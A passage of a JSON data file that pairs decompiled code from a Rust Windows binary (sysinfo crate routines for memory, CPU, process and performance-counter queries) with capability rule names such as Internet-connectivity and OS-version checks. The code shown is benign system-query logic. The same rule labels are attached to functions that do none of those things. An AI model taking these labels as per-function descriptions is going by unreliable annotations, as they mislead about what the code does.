return iVar16;\n    }\n    puVar4 = arg1[1];\n    bVar17 = false;\n    uVar9 = 0;\n    do {\n        if (bVar17) {\n            if ((0xfffffffffffffff0 < uVar9) || (uStack176 <= uVar9 + 0xf)) {\ncode_r0x0043f615:\n                if (uStack176 < 0x10) {\n                    sub.msvcrt.dll_memmove(SUB168(auVar8, 0), puVar4 + 4, puVar4);\n                }\n                else {\n                    uVar5 = puVar4[1];\n                    uVar6 = puVar4[2];\n                    uVar7 = puVar4[3];\n                    puVar15 = puVar4 + uStack176;\n                    *puVar15 = *puVar4;\n                    puVar15[1] = uVar5;\n                    puVar15[2] = uVar6;\n                    puVar15[3] = uVar7;\n                }\n                uVar9 = 0;\n                puVar15 = puVar4;\n                do {\n                    if (uVar9 == uStack176) {\n                        arg1[2] = uStack200 - uStack192;\n                        return -0x7fffffffffffffff;\n                    }\n                    if (*(puVar4 + uVar9) == -0x80) {\n                        puStack184 = puVar4 + ~uVar9 * 0x46;\n                        while( true ) {\n                            uVar10 = sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::__u7b__u7b_closure_u7d__u7d_::h64d7a5d877c0046b\n                                               (&puStack208, arg1, uVar9);\n                            uVar11 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537\n                                               (arg1, uVar10);\n                            uVar13 = uVar10 >> 0x38;\n                            if (((uVar11 - (uVar10 & uVar12) ^ uVar9 - (uVar10 & uVar12)) & uVar12) < 0x10) break;\n                            cVar2 = *(puVar4 + uVar11);\n                            uVar13 = uVar13 >> 1;\n                            *(puVar4 + uVar11) = uVar13;\n                            *((uVar11 - 0x10 & uVar12) + 0x10 + puVar4) = uVar13;\n                            if (cVar2 == -1) {\n                                *(puVar4 + uVar9) = 0xff;\n                                *((uVar9 - 0x10 & uVar12) + 0x10 + puVar4) = 0xff;\n                                sym.memcpy(puVar4 + ~uVar11 * 0x46, puStack184, 0x118);\n                                goto code_r0x0043f73d;\n                            }\n                            iVar16 = ~uVar11 * 0x118 + 0x118;\n                            for (iVar14 = -0x118; iVar14 != 0; iVar14 = iVar14 + 1) {\n                                uVar3 = *(puVar15 + iVar14);\n                                *(puVar15 + iVar14) = *(puVar4 + iVar14 + iVar16);\n                                *(puVar4 + iVar14 + iVar16) = uVar3;\n                            }\n                        }\n                        uVar13 = uVar13 >> 1;\n                        *(puVar4 + uVar9) = uVar13;\n                        *((uVar9 - 0x10 & uVar12) + 0x10 + puVar4) = uVar13;\n                    }\ncode_r0x0043f73d:\n                    uVar9 = uVar9 + 1;\n                    puVar15 = puVar15 + -0x46;\n                } while( true );\n            }\n            uVar10 = uVar9 + 0xf;\n            uVar9 = uVar9 + 0x10;\n        }\n        else {\n            bVar17 = uStack176 <= uVar9;\n            uVar10 = uVar9;\n            uVar9 = uVar9 + (uVar9 < uStack176);\n            if (bVar17) goto code_r0x0043f615;\n        }\n        auVar1 = *(puVar4 + uVar10);\n        *(puVar4 + uVar10) =\n             CONCAT115(-(auVar1 < 0x0), \n                       CONCAT114(-(SUB161(auVar1 >> 0x70, 0) < '\\0'), \n                                 CONCAT113(-(SUB161(auVar1 >> 0x68, 0) < '\\0'), \n                                           CONCAT112(-(SUB161(auVar1 >> 0x60, 0) < '\\0'), \n                                                     CONCAT111(-(SUB161(auVar1 >> 0x58, 0) < '\\0'), \n                                                               CONCAT110(-(SUB161(auVar1 >> 0x50, 0) < '\\0'), \n                                                                         CONCAT19(-(SUB161(auVar1 >> 0x48, 0) < '\\0'), \n                                                                                  CONCAT18(-(SUB161(auVar1 >> 0x40, 0) <\n                                                                                            '\\0'), CONCAT17(-(SUB161(\n                                                            auVar1 >> 0x38, 0) < '\\0'), \n                                                            CONCAT16(-(SUB161(auVar1 >> 0x30, 0) < '\\0'), \n                                                                     CONCAT15(-(SUB161(auVar1 >> 0x28, 0) < '\\0'), \n                                                                              CONCAT14(-(SUB161(auVar1 >> 0x20, 0) <\n                                                                                        '\\0'), CONCAT13(-(SUB161(auVar1 \n                                                            >> 0x18, 0) < '\\0'), \n                                                            CONCAT12(-(SUB161(auVar1 >> 0x10, 0) < '\\0'), \n                                                                     CONCAT11(-(SUB161(auVar1 >> 8, 0) < '\\0'), \n                                                                              -(SUB161(auVar1, 0) < '\\0'))))))))))))))))\n             | auVar8;\n        bVar17 = true;\n    } while( true );\n}\n",
        "token_count": 2619
    },
    "b7b771c7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::tools::get_translation::hb7b771c7086657b5(ulong *arg1, ulong arg2, ulong *arg3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t arg2_00;\n    uchar auStack104 [8];\n    int64_t iStack96;\n    ulong uStack88;\n    uint64_t uStack80;\n    int64_t iStack72;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    ulong uStack48;\n    \n    // sysinfo::windows::tools::get_translation::hb7b771c7086657b5\n    if (arg3[5] != 0) {\n        uVar1 = sym.core::hash::BuildHasher::hash_one::h76031b31976d9960(*arg3, arg3[1], arg2);\n        iVar2 = sym.hashbrown::raw::RawTable_T_A_::find::hc42f239b2befc81e(arg3 + 2, uVar1, arg2);\n        if (iVar2 != 0) {\n            iStack96 = 0;\n            uStack80 = *(iVar2 + -8);\n            sub.pdh.dll_PdhLookupPerfNameByIndexW(0, uStack80, 0, &iStack96);\n            if (iStack96 == 0) {\n                *(arg1 + 1) = ZEXT816(0);\n                *arg1 = 1;\n                return;\n            }\n            uVar1 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hcea65d7f5250fa5a(iStack96);\n            arg2_00 = iStack96;\n            iStack72 = iStack96;\n            uStack88 = uVar1;\n            sub.pdh.dll_PdhLookupPerfNameByIndexW(0, *(iVar2 + -8), uVar1, &iStack96);\n            uVar1 = sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::h09683fc5be074ea2\n                              (uVar1, arg2_00, iStack96 + -1);\n            dbg.from_utf16(&uStack64, uVar1, arg2_00);\n            if (CONCAT44(uStack60, uStack64) != 0) {\n                arg1[2] = uStack48;\n                *arg1 = uStack64;\n                *(arg1 + 4) = uStack60;\n                *(arg1 + 1) = uStack56;\n                *(arg1 + 0xc) = uStack52;\n                sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(&uStack88);\n                return;\n            }\n            dbg.unwrap_failed(\"invalid utf16\", 0xd, auStack104, 0x44bd08);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 695
    },
    "627aa94b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.sysinfo::windows::tools::add_counter::h627aa94b91232368\n               (int64_t *arg1, ulong *arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    ulong *arg1_00;\n    uint8_t uVar1;\n    ushort uVar2;\n    int64_t *piVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    ushort *puVar7;\n    ulong uVar8;\n    ulong arg2_00;\n    uint64_t uVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    ulong *arg3_00;\n    ulong var_10h;\n    ulong uStack264;\n    ulong uStack256;\n    int64_t iStack248;\n    ushort *puStack240;\n    int64_t iStack232;\n    int64_t iStack224;\n    ulong uStack216;\n    uchar auStack208 [8];\n    int64_t iStack200;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    int64_t iStack168;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    int64_t iStack144;\n    int64_t *piStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ushort uStack96;\n    unkbyte6 Stack94;\n    ulong auStack88 [3];\n    \n    // sysinfo::windows::tools::add_counter::h627aa94b91232368\n    uStack112 = *arg1;\n    iVar11 = arg1[2] + uStack112;\n    uStack96 = 0;\n    piStack128 = arg3;\n    uStack104 = iVar11;\n    iVar4 = sym._core::str::iter::EncodeUtf16_as_core::iter::traits::iterator::Iterator_::next::hd7ccc9625ce8f5a7\n                      (&uStack112);\n    if (iVar4 == 0) {\n        uStack216 = 0x2;\n        _auStack208 = ZEXT816(0);\n    }\n    else {\n        uVar2 = iVar11;\n        uVar6 = (uStack104 - uStack112) + 3U >> 2;\n        uVar9 = 3;\n        if (3 < uVar6) {\n            uVar9 = uVar6;\n        }\n        puVar7 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hcea65d7f5250fa5a(uVar9 + 1);\n        *puVar7 = uVar2;\n        iStack248 = 1;\n        iStack168 = CONCAT62(Stack94, uStack96);\n        uStack184 = uStack112;\n        uStack180 = uStack112._4_4_;\n        uStack176 = uStack104;\n        uStack172 = uStack104._4_4_;\n        uStack264 = puVar7;\n        uStack256 = iVar11;\n        while( true ) {\n            iVar10 = iStack248;\n            iVar4 = sym._core::str::iter::EncodeUtf16_as_core::iter::traits::iterator::Iterator_::next::hd7ccc9625ce8f5a7\n                              (&uStack184);\n            if (iVar4 != 1) break;\n            uVar2 = iVar11;\n            if (iVar10 == uStack256) {\n                iVar11 = iVar10;\n                uVar8 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h80ea03ef37d555fd\n                                  (&uStack264, iVar10, \n                                   ((CONCAT44(uStack172, uStack176) - CONCAT44(uStack180, uStack184)) + 3U >> 2) + 1);\n                sym._ZN5alloc7raw_vec14handle_reserve17h5bdf8892013f3606E.348(uVar8, iVar11);\n                puVar7 = uStack264;\n            }\n            puVar7[iVar10] = uVar2;\n            iStack248 = iVar10 + 1;\n        }\n        uStack216 = uStack264;\n        _auStack208 = CONCAT88(iStack248, uStack256);\n    }\n    sym.alloc::vec::Vec_T_A_::push::h3822946f157e7ae8(&uStack216, 0);\n    sym._alloc::vec::Vec_T_A__as_core::clone::Clone_::clone::h3b0aa9e2f8c0d933(auStack88, &uStack216);\n    iVar11 = sym.hashbrown::map::HashMap_K_V_S_A_::get_inner::haccc908f1bb6c564(arg2 + 2, arg4);\n    if (iVar11 == 0) {\n        uStack120 = 0;\n        iVar5 = sub.pdh.dll_PdhAddCounterW(*arg2, auStack88[0], 0);\n        if (iVar5 == 0) {\n            dbg.clone(&uStack112, *arg4, arg4[2]);\n            uVar8 = uStack120;\n            iStack248 = CONCAT62(Stack94, uStack96);\n            arg3_00 = &uStack264;\n            uStack264 = uStack112;\n            uStack256 = uStack104;\n            arg2_00 = sym.core::hash::BuildHasher::hash_one::h76031b31976d9960(arg2[2], arg2[3], arg3_00);\n            arg1_00 = arg2 + 4;\n            iVar11 = sym.hashbrown::raw::RawTable_T_A_::find::h3c063cbcc14ed5aa(arg1_00, arg2_00, arg3_00);\n            if (iVar11 == 0) {\n                iStack168 = iStack248;\n                uStack184 = uStack264;\n                uStack180 = uStack264._4_4_;\n                uStack176 = uStack256;\n                uStack172 = uStack256._4_4_;\n                iVar11 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537(arg1_00, arg2_00);\n                uVar1 = *(arg2[5] + iVar11);\n                uVar9 = arg3_00 & 0xffffffffffffff00 | uVar1;\n                if ((arg2[6] == 0) && ((uVar1 & 1) != 0)) {\n                    uVar9 = arg3_00 & 0xffffff00 | uVar1;\n                    sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::h94f05646494975ed(arg1_00, arg2 + 2);\n                    iVar11 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537(arg1_00, arg2_00)\n                    ;\n                }\n                sym.hashbrown::raw::RawTableInner_A_::record_item_insert_at::h24d089cf3fcd1ed6\n                          (arg1_00, iVar11, uVar9, arg2_00);\n                iVar10 = arg2[5] + iVar11 * -0x20;\n                *(arg2[5] + -0x10 + iVar11 * -0x20) = iStack168;\n                *(iVar10 + -0x20) = uStack184;\n                *(iVar10 + -0x1c) = uStack180;\n                *(iVar10 + -0x18) = uStack176;\n                *(iVar10 + -0x14) = uStack172;\n                *(iVar10 + -8) = uVar8;\n            }\n            else {\n                *(iVar11 + -8) = uVar8;\n                sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&uStack264);\n            }\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(auStack88);\n            piVar3 = piStack128;\n            iStack248 = arg4[2];\n            uStack264 = *arg4;\n            uStack256 = arg4[1];\n            uStack160 = uStack216;\n            uStack156 = uStack216._4_4_;\n            uStack152 = auStack208._0_4_;\n            uStack148 = auStack208._4_4_;\n            iStack144 = iStack200;\n            puStack240 = uStack216;\n            iStack232 = SUB168(_auStack208, 0);\n            iStack224 = iStack200;\n            iStack168 = iStack248;\n            if (*piStack128 != 0) {\n                sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(piStack128);\n                sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(piVar3 + 3);\n            }\n            piVar3[4] = iStack232;\n            piVar3[5] = iStack224;\n            piVar3[2] = iStack248;\n            piVar3[3] = puStack240;\n            *piVar3 = uStack264;\n            *(piVar3 + 4) = uStack264._4_4_;\n            *(piVar3 + 1) = uStack256;\n            *(piVar3 + 0xc) = uStack256._4_4_;\n            goto code_r0x0043fbe6;\n        }\n    }\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(auStack88);\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(&uStack216);\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg4);\ncode_r0x0043fbe6:\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(arg1);\n    return;\n}\n",
        "token_count": 2362
    },
    "5e91b5c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym._sysinfo::windows::system::System_as_sysinfo::traits::SystemExt_::refresh_memory::h5e91b5c3dbad9693\n               (int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uchar auStack216 [16];\n    uchar auStack200 [16];\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    ulong uStack120;\n    uchar auStack104 [8];\n    uint64_t uStack96;\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uchar auStack56 [16];\n    \n    // <sysinfo::windows::system::System as sysinfo::traits::SystemExt>::refresh_memory::h5e91b5c3dbad9693\n    uVar4 = 0;\n    uVar5 = 0;\n    uVar6 = 0;\n    uVar7 = 0;\n    auStack56 = ZEXT816(0);\n    auStack72 = ZEXT816(0);\n    auStack88 = ZEXT816(0);\n    _auStack104 = CONCAT124(SUB1612(ZEXT816(0) >> 0x20, 0), 0x40);\n    sub.KERNEL32.dll_GlobalMemoryStatusEx(auStack104);\n    *(arg1 + 0x30) = uStack96 / 1000;\n    *(arg1 + 0x38) = auStack88._0_8_ / 1000;\n    auStack136 = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    auStack152 = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    auStack168 = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    auStack184 = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    auStack200 = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    auStack216 = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    uStack120 = 0;\n    iVar1 = sub.PSAPI.DLL_GetPerformanceInfo(auStack216, 0x68);\n    if (iVar1 == 1) {\n        iVar2 = auStack200._0_8_ - auStack184._0_8_;\n        if (auStack200._0_8_ < auStack184._0_8_) {\n            iVar2 = 0;\n        }\n        iVar3 = auStack216._8_8_ - auStack184._0_8_;\n        if (auStack216._8_8_ < auStack184._0_8_) {\n            iVar3 = 0;\n        }\n        *(arg1 + 0x40) = (iVar2 * auStack136._0_8_) / 1000;\n        *(arg1 + 0x48) = (iVar3 * auStack136._0_8_) / 1000;\n    }\n    return;\n}\n",
        "token_count": 755
    },
    "fbdaaaae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym._sysinfo::windows::system::System_as_sysinfo::traits::SystemExt_::refresh_cpu::hfbdaaaae82ff89f1(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    char *arg1_00;\n    ulong arg2;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong arg3;\n    uint extraout_XMM0_Da;\n    uint extraout_XMM0_Da_00;\n    \n    // <sysinfo::windows::system::System as sysinfo::traits::SystemExt>::refresh_cpu::hfbdaaaae82ff89f1\n    if (*(arg1 + 0x148) != 0) {\n        sub.pdh.dll_PdhCollectQueryData(*(arg1 + 0x120));\n        if (*(arg1 + 0x68) != 0) {\n            iVar3 = sym.sysinfo::windows::processor::Query::get::h50bb849b2cd78639(arg1 + 0x120, arg1 + 0x68);\n            if (iVar3 == 0) {\n                arg1_00 = \n                \"global_key_idle disappearedC:\\\\Users\\\\Anonymous\\\\.cargo\\\\registry\\\\src\\\\github.com-1ecc6299db9ec823\\\\sysinfo-0.20.5\\\\src\\\\windows\\\\system.rs\"\n                ;\n                arg3 = 0x44c3c8;\n                arg2 = 0x1b;\ncode_r0x0043ff7e:\n                dbg.expect_failed(arg1_00, arg2, arg3);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            *(arg1 + 0xd0) = extraout_XMM0_Da;\n        }\n        iVar1 = *(arg1 + 0xd8);\n        iVar2 = *(arg1 + 0xe8);\n        iVar4 = iVar1;\n        for (iVar5 = 0; iVar2 * 0x88 - iVar5 != 0; iVar5 = iVar5 + 0x88) {\n            if (*(iVar4 + 0x18) != 0) {\n                iVar3 = sym.sysinfo::windows::processor::Query::get::h50bb849b2cd78639\n                                  (arg1 + 0x120, iVar1 + 0x18 + iVar5);\n                if (iVar3 == 0) {\n                    arg1_00 = \"key_used disappeared\";\n                    arg3 = 0x44c3f8;\n                    arg2 = 0x14;\n                    goto code_r0x0043ff7e;\n                }\n                *(iVar1 + 0x80 + iVar5) = extraout_XMM0_Da_00;\n            }\n            iVar4 = iVar4 + 0x88;\n        }\n    }\n    return;\n}\n",
        "token_count": 628
    },
    "1990fecb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym._sysinfo::windows::system::System_as_sysinfo::traits::SystemExt_::refresh_processes::h1990fecb0cd854ab\n               (ulong *arg1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uchar auVar3 [16];\n    ulong *puVar4;\n    ulong *arg1_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    ulong arg2;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t in_RDX;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uchar (*pauVar12) [16];\n    ulong *puVar13;\n    ulong **ppuVar14;\n    uchar (*pauVar15) [16];\n    ulong *puVar16;\n    bool bVar17;\n    uchar extraout_XMM0 [16];\n    ulong var_10h;\n    ulong var_18h;\n    int32_t iStack812;\n    ulong *puStack808;\n    ulong *puStack800;\n    uchar (*pauStack792) [16];\n    int64_t iStack784;\n    int64_t iStack776;\n    uchar (*pauStack768) [16];\n    uchar auStack760 [16];\n    ulong uStack744;\n    ulong uStack736;\n    uint64_t uStack728;\n    ulong *puStack720;\n    ulong uStack712;\n    int64_t iStack704;\n    uchar (*pauStack696) [16];\n    ulong uStack688;\n    uchar (*pauStack680) [16];\n    uint64_t uStack672;\n    int64_t iStack664;\n    int64_t iStack656;\n    uint64_t uStack648;\n    ulong uStack640;\n    ulong *puStack632;\n    uchar (*pauStack624) [16];\n    ulong *puStack616;\n    uint uStack608;\n    uint uStack604;\n    uint64_t uStack600;\n    uint64_t auStack592 [9];\n    uint uStack520;\n    uint uStack516;\n    uint uStack512;\n    uint uStack508;\n    uint64_t uStack504;\n    ulong *puStack440;\n    uint64_t uStack432;\n    uint64_t uStack424;\n    ulong **ppuStack416;\n    ulong *puStack408;\n    uchar (**ppauStack400) [16];\n    uchar (*pauStack336) [16];\n    uchar (*pauStack328) [16];\n    uchar *puStack320;\n    uint16_t uStack312;\n    ulong uStack304;\n    ulong uStack168;\n    \n    // <sysinfo::windows::system::System as sysinfo::traits::SystemExt>::refresh_processes::h1990fecb0cd854ab\n    uVar11 = 0x80000;\n    while( true ) {\n        iVar6 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(uVar11);\n        iStack812 = 0;\n        iVar10 = iVar6;\n        iStack664 = iVar6;\n        iStack656 = in_RDX;\n        uStack648 = uVar11;\n        iVar5 = sub.ntdll.dll_NtQuerySystemInformation(5, iVar6, uVar11 & 0xffffffff, &iStack812);\n        if (iVar5 != -0x3ffffffc) break;\n        if (iStack812 == 0) {\n            uVar11 = uVar11 * 2;\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&iStack664);\n            in_RDX = iVar10;\n        }\n        else {\n            uVar11 = iStack812 + 0x2800;\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&iStack664);\n            in_RDX = iVar10;\n        }\n    }\n    puVar7 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                       (4000, 8);\n    if (puVar7 == NULL) {\n        dbg.handle_alloc_error(4000);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    uStack736 = 500;\n    uStack728 = 0;\n    iVar10 = 0;\n    uStack744 = puVar7;\n    while( true ) {\n        if (uStack728 == uStack736) {\n            sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h7a03986b0ed0c4b8(&uStack744, uStack736);\n            puVar7 = uStack744;\n        }\n        puVar7[uStack728] = iVar6 + iVar10;\n        uStack728 = uStack728 + 1;\n        uVar11 = *(iVar6 + iVar10);\n        if (uVar11 == 0) break;\n        iVar10 = iVar10 + uVar11;\n    }\n    uStack640 = arg1[0x1d];\n    puStack408 = &uStack640;\n    ppuStack416 = &puStack632;\n    pauStack336 = NULL;\n    puStack632 = arg1;\n    fcn.0044114c(&pauStack336);\n    uVar11 = uStack728;\n    ppauStack400 = &pauStack624;\n    pauStack624 = pauStack336;\n    pauStack768 = 0x8;\n    auStack760 = extraout_XMM0 & 0x0;\n    uStack424 = uStack728;\n    puStack440 = uStack744;\n    uStack432 = uStack736;\n    puStack616 = &uStack520;\n    uStack608 = 0;\n    uStack604 = 0;\n    uStack520 = uStack744;\n    uStack516 = uStack744._4_4_;\n    uStack512 = uStack736;\n    uStack508 = uStack736._4_4_;\n    uStack504 = 0;\n    uStack600 = uStack728;\n    auStack592[0] = uStack728;\n    if (uStack736 < uStack728) {\n        dbg.panic(str.assertion_failed:_vec.capacity_____start___lenC:UsersAnonymous.cargo_registry_srcgithub.com_1ecc6299db9ec823_rayon_1.5.3_src_vec.rs\n                  , 0x2f, str.assertion_failed:_vec.capacity_____start___lenC:UsersAnonymous.cargo_registry_srcgithub.com_1ecc6299db9ec823_rayon_1.5.3_src_vec.rs\n                          + 0x88);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    sym.rayon::iter::plumbing::LengthSplitter::new::hbce6dfd9f33a120c(uStack728);\n    sym.rayon::iter::plumbing::bridge_producer_consumer::helper::hd38c8e70ff773f4b(&puStack720);\n    if ((uVar11 != 0) && (uStack504 != 0)) {\n        uStack672 = uStack504;\n        if (uStack504 != uVar11) {\n            pauStack336 = NULL;\n            sym.core::panicking::assert_failed::h272e868455368c21(&uStack672, auStack592, &pauStack336, 0x44be18);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        uStack504 = 0;\n    }\n    if ((CONCAT44(uStack508, uStack512) != 0) &&\n       (auVar3 = ZEXT816(CONCAT44(uStack508, uStack512)) * ZEXT816(8),  SUB168(auVar3 >> 0x40, 0) == 0)) {\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.347\n                  (CONCAT44(uStack516, uStack520), SUB168(auVar3, 0), 8);\n    }\n    puVar4 = puStack720;\n    iVar6 = 0;\n    iVar10 = iStack704;\n    for (puVar7 = puStack720; (bVar17 = iVar10 != 0,  iVar10 = iVar10 + -1,  bVar17 && (puVar7 != NULL));\n        puVar7 = *puVar7) {\n        iVar6 = iVar6 + puVar7[4];\n    }\n    puStack808 = arg1;\n    sym.alloc::vec::Vec_T_A_::reserve::h7e6b571d9f98cf37(&pauStack768, iVar6);\n    puStack440 = puVar4;\n    uStack432 = uStack712;\n    uStack424 = iStack704;\n    while( true ) {\n        iVar10 = sym.alloc::collections::linked_list::LinkedList_T_::pop_front_node::h58c0a23a189377d5(&puStack440);\n        if (iVar10 == 0) break;\n        pauVar15 = *(iVar10 + 0x10);\n        puStack616 = *(iVar10 + 0x18);\n        uStack608 = *(iVar10 + 0x20);\n        uStack604 = *(iVar10 + 0x24);\n        sym.alloc::alloc::box_free::h91e91b6a3a2d0da5(iVar10);\n        if (pauVar15 == NULL) break;\n        pauStack328 = puStack616;\n        puStack320 = CONCAT44(uStack604, uStack608);\n        iVar10 = puStack320;\n        pauStack336 = pauVar15;\n        sym.alloc::vec::Vec_T_A_::reserve::h7e6b571d9f98cf37(&pauStack768, puStack320);\n        sym.memcpy(pauStack768[auStack760._8_8_ * 0x11], pauVar15, iVar10 * 0x110);\n        auStack760 = CONCAT88(auStack760._8_8_ + iVar10, auStack760._0_8_);\n        puStack320 = NULL;\n        sym.core::ptr::drop_in_place_alloc::vec::Vec_sysinfo::windows::process::Process__::hc2f3588007d941dd\n                  (&pauStack336);\n    }\n    sym._alloc::collections::linked_list::LinkedList_T__as_core::ops::drop::Drop_::drop::hb16d65907ff622dd(&puStack440);\n    puVar7 = puStack808;\n    puStack800 = puStack808 + 2;\n    pauStack336 = puStack808[3];\n    puStack320 = *pauStack336 + puStack808[2] + 1;\n    auVar3 = *pauStack336;\n    uStack312 = ~(SUB161(auVar3 >> 7, 0) & 1 | (SUB161(auVar3 >> 0xf, 0) & 1) << 1 |\n                  (SUB161(auVar3 >> 0x17, 0) & 1) << 2 | (SUB161(auVar3 >> 0x1f, 0) & 1) << 3 |\n                  (SUB161(auVar3 >> 0x27, 0) & 1) << 4 | (SUB161(auVar3 >> 0x2f, 0) & 1) << 5 |\n                  (SUB161(auVar3 >> 0x37, 0) & 1) << 6 | (SUB161(auVar3 >> 0x3f, 0) & 1) << 7 |\n                  (SUB161(auVar3 >> 0x47, 0) & 1) << 8 | (SUB161(auVar3 >> 0x4f, 0) & 1) << 9 |\n                  (SUB161(auVar3 >> 0x57, 0) & 1) << 10 | (SUB161(auVar3 >> 0x5f, 0) & 1) << 0xb |\n                  (SUB161(auVar3 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar3 >> 0x6f, 0) & 1) << 0xd |\n                  (SUB161(auVar3 >> 0x77, 0) & 1) << 0xe | SUB161(auVar3 >> 0x7f, 0) << 0xf);\n    uStack304 = puStack808[5];\n    pauStack328 = pauStack336[1];\n    while( true ) {\n        iVar10 = sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::h3b916558db69be83\n                           (&pauStack336);\n        puVar4 = puStack808;\n        if (iVar10 == 0) break;\n        cVar2 = *(iVar10 + -4);\n        *(iVar10 + -4) = 0;\n        if (cVar2 == '\\0') {\n            sym.hashbrown::raw::RawTableInner_A_::erase::h14c5f54342946935(puStack800, (puVar7[3] - iVar10) / 0x118);\n            sym.core::ptr::drop_in_place_sysinfo::windows::process::Process_::he2d436bb30ee18b4(iVar10 + -0x110);\n        }\n    }\n    uStack688 = auStack760._0_8_;\n    iVar10 = auStack760._8_8_ * 0x110;\n    pauStack696 = pauStack768[auStack760._8_8_ * 0x11];\n    pauStack680 = pauStack768;\n    pauVar15 = pauStack768;\n    do {\n        if (iVar10 == 0) {\ncode_r0x00440983:\n            sym.core::ptr::drop_in_place__sysinfo::windows::process::Process__::h82561d4614afe4c7(pauVar15);\n            